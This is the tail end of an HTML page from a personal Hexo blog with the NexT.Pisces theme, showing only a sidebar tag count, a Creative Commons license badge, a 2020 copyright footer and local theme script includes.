        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/en" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mrh929</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.0
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  















  

  

</body>
</html>
